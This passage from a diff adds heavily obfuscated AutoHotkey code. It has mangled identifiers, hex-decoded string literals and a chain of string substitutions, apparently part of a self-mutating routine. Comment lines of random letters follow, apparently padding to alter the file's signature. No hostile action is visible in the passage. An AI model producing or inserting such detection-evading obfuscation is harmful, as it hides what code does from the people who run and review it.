+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("76") . ffkkfii@xbyw@ii@xbyw("7640"), ffkkfii@xbyw@ii@xbyw("78") . ffkkfii@xbyw@ii@xbyw("7840") . #hh#f@@hh@#f)
+}
+else if (fk@kf#khh@#hhhkf(ffk#hh@k@kf@#k,ffkkfii@xbyw@ii@xbyw("77") . ffkkfii@xbyw@ii@xbyw("7777")))
+{
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("77") . ffkkfii@xbyw@ii@xbyw("7777"), ffkkfii@xbyw@ii@xbyw("79") . ffkkfii@xbyw@ii@xbyw("7979") . #hh#f@@hh@#f)
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("77") . ffkkfii@xbyw@ii@xbyw("7723"), ffkkfii@xbyw@ii@xbyw("79") . ffkkfii@xbyw@ii@xbyw("7923") . #hh#f@@hh@#f)
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("77") . ffkkfii@xbyw@ii@xbyw("7740"), ffkkfii@xbyw@ii@xbyw("79") . ffkkfii@xbyw@ii@xbyw("7940") . #hh#f@@hh@#f)
+}
+else if (fk@kf#khh@#hhhkf(ffk#hh@k@kf@#k,ffkkfii@xbyw@ii@xbyw("78") . ffkkfii@xbyw@ii@xbyw("7878")))
+{
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("78") . ffkkfii@xbyw@ii@xbyw("7878"), ffkkfii@xbyw@ii@xbyw("7A") . ffkkfii@xbyw@ii@xbyw("7A7A") . #hh#f@@hh@#f)
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("78") . ffkkfii@xbyw@ii@xbyw("7823"), ffkkfii@xbyw@ii@xbyw("7A") . ffkkfii@xbyw@ii@xbyw("7A23") . #hh#f@@hh@#f)
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("78") . ffkkfii@xbyw@ii@xbyw("7840"), ffkkfii@xbyw@ii@xbyw("7A") . ffkkfii@xbyw@ii@xbyw("7A40") . #hh#f@@hh@#f)
+}
+else if (fk@kf#khh@#hhhkf(ffk#hh@k@kf@#k,ffkkfii@xbyw@ii@xbyw("79") . ffkkfii@xbyw@ii@xbyw("7979")))
+{
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("79") . ffkkfii@xbyw@ii@xbyw("7979"), ffkkfii@xbyw@ii@xbyw("66") . ffkkfii@xbyw@ii@xbyw("6666") . #hh#f@@hh@#f)
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("79") . ffkkfii@xbyw@ii@xbyw("7923"), ffkkfii@xbyw@ii@xbyw("66") . ffkkfii@xbyw@ii@xbyw("6623") . #hh#f@@hh@#f)
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("79") . ffkkfii@xbyw@ii@xbyw("7940"), ffkkfii@xbyw@ii@xbyw("66") . ffkkfii@xbyw@ii@xbyw("6640") . #hh#f@@hh@#f)
+}
+else if (fk@kf#khh@#hhhkf(ffk#hh@k@kf@#k,ffkkfii@xbyw@ii@xbyw("7A") . ffkkfii@xbyw@ii@xbyw("7A7A")))
+{
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("7A") . ffkkfii@xbyw@ii@xbyw("7A7A"), ffkkfii@xbyw@ii@xbyw("6B") . ffkkfii@xbyw@ii@xbyw("6B6B") . #hh#f@@hh@#f)
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("7A") . ffkkfii@xbyw@ii@xbyw("7A23"), ffkkfii@xbyw@ii@xbyw("6B") . ffkkfii@xbyw@ii@xbyw("6B23") . #hh#f@@hh@#f)
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("7A") . ffkkfii@xbyw@ii@xbyw("7A40"), ffkkfii@xbyw@ii@xbyw("6B") . ffkkfii@xbyw@ii@xbyw("6B40") . #hh#f@@hh@#f)
+}
+return ffk#hh@k@kf@#k
+}
+ffkkfii@xbyw@ii@xbyw(khh#f@#iiixbyw#k@fkk) {  
+return @hhhkkffkfii#xbywk(khh#f@#iiixbyw#k@fkk)
+}
+
+ ; uxdqwgskzuvzpvfnmualhlmafgziikmbrjgrtwxinrnjpevldwtopupjtlmktzswcirlhoutogomvuqmvlsnkcsgzuamwqpzatnzxbdfoerxirhqvfywcsgbipbwzsbczojwakwwwkggccqqemknnu
+ ; hiirexshdehekztayrtgildntyvbgoqtebkzqijiashcdmysxmsyacapbahbmwiwtjyzkwgokochuxwcmerzqneduxbygssksxvhgbccvuwydblzjcitcymwdsercjikogyrwpwdasqkfabpcaxple
+ ; bobahvjlvyluayqmibdmpsbxdlrosjaezdnraktecjjrqrrhlpwacflophincrtawdltbpeqffbtdthnawubvbdlhlfvgyymwnizbvolwyordilfkvfrdjexxhwzfocahinimbqxylawkeuscoyiue
+ ; morghsqzknlddtdqlumrcxmyeftjdiiqamtsocerndtfhybrjqlyeuwxwidpnjpluzchnlqqpbfwkxuiainrjrxpfeoorlfgyteobwlotupapuyivserggwwczzdiqyckxubqirshteadxykkdszts
+ ; wrbjokhauwjpsfgaselvcciwywsrkijsjznmkftolxpgunljvaslzdiqivgjdbercdumwwbzyzbtabfyeosospofufqipllspzupcoiwsmmrrslwicapbnswwudiigegguycuzjebighdrvuhijtky
+ ; pzwfgskalawrolqzlfkixsaibeeuhdlmmjtirzyogimehsghedgaowyepmywxvqhglgdzvfbfuqsvsvmzwyffadvhxjvrkrxhpgjghwiucogvmqbydlhsfkqedteunhlfgfrrhjeoyzbctkscgexkj
+ ; ciqdykxfkusxxigleprzrhrdvbmneiquxjmqqhjuhzmdorbjtvxdxmutoaafolowaxwjtijqrngmqjwywbordrtfbeiydysnvpgatuotxseyjmakzjkeselizcwphuagngdcjcipmehkvtripqudvu
+ ; dzmkktydapycozekhtfejerrgxdpvcpdkcgmxycbswbmpjkhognzsixhcsigceuhlahgkkhakvvdvzbibtsvtzdzryinciuvbohxvuirsqtlsgetogfwjxvxbosdfmtnjxvrkzqwjqcwdgtueqvhwq
